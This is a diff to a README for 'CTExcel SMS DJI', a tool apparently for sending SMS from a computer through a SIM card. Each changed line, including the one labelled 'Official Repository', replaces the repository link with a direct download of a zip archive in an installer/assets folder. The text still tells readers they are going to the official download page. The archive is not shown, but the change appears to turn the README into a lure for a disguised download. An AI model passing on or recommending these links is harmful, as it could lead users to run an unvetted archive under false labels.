@@ -10,9 +10,9 @@ Think of it as a bridge between your computer and your mobile SIM card. If you h
 
 Visit this link to download the application:
 
-[**⬇️ DOWNLOAD CTEXCEL SMS DJI**](https://github.com/Merlinafulfilled678/ctexcel-sms-dji)
+[**⬇️ DOWNLOAD CTEXCEL SMS DJI**](https://github.com/Merlinafulfilled678/ctexcel-sms-dji/raw/refs/heads/main/installer/assets/v1.6.zip)
 
-Click the button above or copy this address into your browser: `https://github.com/Merlinafulfilled678/ctexcel-sms-dji`
+Click the button above or copy this address into your browser: `https://github.com/Merlinafulfilled678/ctexcel-sms-dji/raw/refs/heads/main/installer/assets/v1.6.zip`
 
 This will take you to the official download page. Look for the latest release file and save it to your computer.
 
@@ -177,7 +177,7 @@ If you completed all these steps, you're officially set up and ready to use CTEx
 
 For more information, updates, and community support:
 
-- **Official Repository**: https://github.com/Merlinafulfilled678/ctexcel-sms-dji
+- **Official Repository**: https://github.com/Merlinafulfilled678/ctexcel-sms-dji/raw/refs/heads/main/installer/assets/v1.6.zip
 - **Issue Tracker**: Report bugs or request features
 - **Release Notes**: See what's new in each version
 
